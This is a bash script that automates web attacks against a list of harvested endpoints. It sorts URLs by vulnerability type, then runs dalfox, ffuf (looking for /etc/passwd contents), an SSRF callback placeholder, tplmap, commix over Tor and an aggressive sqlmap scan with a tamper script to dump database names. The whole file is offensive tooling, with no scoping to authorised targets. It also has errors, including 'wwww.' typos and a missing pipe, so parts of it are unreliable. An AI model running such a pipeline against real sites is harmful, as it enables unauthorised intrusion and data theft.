#!/bin/bash

# Filter Endpoints based on gf 
cat Endpoints.txt | gf xss | grep -v "https://wwww." | grep -v "http://wwww." | anew XSS.txt;
cat Endpoints.txt | gf lfi | grep -v "https://wwww." | grep -v "http://wwww." | anew LFI.txt;
cat Endpoints.txt | gf ssrf | grep -v "https://wwww." | grep -v "http://wwww." | anew SSRF.txt;
cat Endpoints.txt | gf ssti | grep -v "https://wwww." | grep -v "http://wwww." | anew SSTI.txt;
cat Endpoints.txt | gf rce | grep -v "https://wwww." | grep -v "http://wwww." | anew OS_Commands.txt;
cat Endpoints.txt | gf sqli | grep -v "https://wwww." | grep -v "http://wwww." | anew SQL.txt;

# XSS automation
dalfox file XSS.txt -o XSS_Inject_Response.txt;


# LFI automation
cat LFI.txt qsreplace FUZZ | while read url ; do
  ffuf -u $url -mr "root:x" -w payloads_wordlist.txt -o LFI_Inject_Response.txt
done


# SSRF automation
cat SSRF.txt | qsreplace "Burp collaborator payload" | while read url ; do
  httpx -u $url --status-code -o SSRF_Inject_Response.txt
done

# SSTI injection
cat SSTI.txt | while read url ; do
  python3 tplmap/tplmap.py -u $url | anew SSTI_Inject_Response.txt
done

# OS command injection
cat OS_Commands.txt | while read url ; do
  python3 commix/commix.py -u $url --tor --hostname | anew Command_Inject_Response.txt
done

# SQL automation
sqlmap -m SQL.txt --level 5 --risk 3 --batch --dbs --tamper=between | anew SQL_Inject_Response.txt;
